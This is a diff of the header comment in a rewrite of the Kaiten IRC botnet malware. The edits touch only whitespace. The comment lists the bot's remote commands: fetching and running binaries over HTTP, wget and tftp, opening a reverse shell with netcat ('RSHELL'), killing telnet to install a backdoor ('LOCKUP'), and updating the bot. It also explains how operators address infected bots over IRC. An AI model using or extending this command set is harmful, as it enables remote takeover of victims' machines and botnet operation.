@@ -11,7 +11,7 @@ A Kaiten rewrite, with much new functionality, and many fixes for the old stuff!
  *.......:..:....8 :....8 :....8 :.....::..:.....:..:::::..::.....:..:::..     *
  *::::::::::::ooP'.::ooP'.::ooP'.:::::::::::::::::::::::::::::::::::::::::     *
  *::::::::::::...::::...::::...:::::::::::::::::::::::::::::::::::::::::::     *
- ***************************************************************************** *                                                               
+ ***************************************************************************** *
  * This is a remake of Kaiten, hacked together from various versions scattered *
  * throughout cyberspace. New features include a variety of awesome shell one- *
  * liners, ability to upgrade the bot over http (via gcc or static binary), a  *
@@ -60,7 +60,7 @@ A Kaiten rewrite, with much new functionality, and many fixes for the old stuff!
  *       ISH <command>                 = "Interactive" SH, send to channel     *
  *       BASH <command>                = Run a bash command                    *
  *       SHD <command>                 = Daemonize command                     *
- *       UPDATE <http://server/bot>    = Update this bot		       *
+ *       UPDATE <http://server/bot>    = Update this bot                       *
  *       HACKPKG <http://server/bin>   = Install binary (no dependencies)      *
  *       INSTALL <http://server/bin>   = Install binary (via wget)             *
  *       BINUPDATE <http://server/bin> = Update a binary (via wget)            *
@@ -69,7 +69,7 @@ A Kaiten rewrite, with much new functionality, and many fixes for the old stuff!
  *       RSHELL <ip port>              = Equates to nohup nc ip port           *
  *       GETBB <tftp server>           = Get a proper busybox (via tftp)       *
  *       LOCKUP <http://server/bin>    = Kill telnet, install a backdoor!      *
- *       
+ *                                                                             *
  * Remember, all these commands must be prefixed by a ! and the nickname that  *
  * you want the command to be sent to (can include wildcards). There are no    *
  * spaces in between the ! and the nickname, and there are no spaces before    *
